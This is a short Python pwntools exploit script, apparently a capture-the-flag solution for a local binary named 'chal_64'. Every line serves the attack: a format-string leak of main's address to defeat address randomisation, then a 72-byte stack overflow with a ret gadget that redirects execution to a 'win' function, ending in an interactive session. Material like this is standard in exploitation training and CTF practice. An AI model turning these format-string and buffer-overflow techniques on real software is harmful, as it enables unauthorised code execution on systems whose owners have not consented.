from pwn import *

io = process("./chal_64")

elf = context.binary = ELF("./chal_64", checksec=False)


io.sendlineafter(b'Input: \n', '%19$p')

main_address = int(io.recvline().strip().ljust(8,b'\x00'),16)
print(f'leaked main: {hex(main_address)}')

elf.address = main_address - elf.sym['main']

print(f'Base address: {hex(elf.address)}')

rop = ROP("./chal_64")


offset = 72

ret = elf.address + 0x0000000000001016
win = elf.address + 0x0000000000001169

payload = b'A'*offset + p64(ret) + p64(win)

io.sendlineafter(b'2nd Input: \n', payload)

io.interactive()

